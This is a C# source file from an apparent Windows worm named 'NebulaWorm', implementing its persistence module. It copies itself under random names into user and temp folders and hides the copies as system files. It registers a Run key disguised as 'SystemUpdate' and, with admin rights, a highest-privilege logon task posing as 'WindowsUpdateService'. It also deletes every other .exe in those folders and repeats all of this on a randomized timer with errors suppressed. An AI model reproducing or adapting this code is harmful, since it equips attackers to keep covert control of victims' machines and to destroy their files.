using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;

namespace NebulaWorm
{
    internal static class Persistence
    {
        private static readonly string[] possibleFolders = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Path.GetTempPath()
        };

        private static readonly string registryKeyName = "SystemUpdate";

        private static Random rnd = new Random();

        public static void Apply()
        {
            Thread persistenceThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        
                        string folder = possibleFolders[rnd.Next(possibleFolders.Length)];
                        string exeName = GetRandomFileName();
                        string targetPath = Path.Combine(folder, exeName);

                        CopyAndHide(targetPath);
                        UpdateRegistry(targetPath);
                        if (IsAdministrator())
                            CreateOrUpdateScheduledTask(targetPath);

                        CleanOldCopies(targetPath);

                      
                        int delay = rnd.Next(30, 90) * 60 * 1000;
                        Thread.Sleep(delay);
                    }
                    catch { }
                }
            });

            persistenceThread.IsBackground = true;
            persistenceThread.Start();
        }

        private static string GetRandomFileName()
        {
            
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            int len = rnd.Next(8, 13);
            char[] nameChars = new char[len];
            for (int i = 0; i < len; i++)
            {
                nameChars[i] = chars[rnd.Next(chars.Length)];
            }
            return new string(nameChars) + ".exe";
        }

        private static void CopyAndHide(string targetPath)
        {
            try
            {
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;

              
                if (!File.Exists(targetPath))
                {
                    File.Copy(currentExe, targetPath);
                }

            
                File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
            }
            catch { }
        }

        private static void UpdateRegistry(string exePath)
        {
            try
            {
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (rk != null)
                    {
                        rk.SetValue(registryKeyName, exePath);
                    }
                }
            }
            catch { }
        }

        private static void CreateOrUpdateScheduledTask(string exePath)
        {
            try
            {
                string taskName = "WindowsUpdateService"; 
                string arguments = $"/Create /SC ONLOGON /RL HIGHEST /TN \"{taskName}\" /TR \"{exePath}\" /F";
                ProcessStartInfo psi = new ProcessStartInfo("schtasks.exe", arguments)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process process = Process.Start(psi);
                process?.WaitForExit();
            }
            catch { }
        }

        private static void CleanOldCopies(string currentPath)
        {
            try
            {
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;

                foreach (var folder in possibleFolders)
                {
                    foreach (var file in Directory.GetFiles(folder, "*.exe"))
                    {
                        if (!file.Equals(currentPath, StringComparison.OrdinalIgnoreCase) &&
                            !file.Equals(currentExe, StringComparison.OrdinalIgnoreCase))
                        {
                            try
                            {
                                File.Delete(file);
                            }
                            catch { }
                        }
                    }
                }
            }
            catch { }
        }

        private static bool IsAdministrator()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }
    }
}
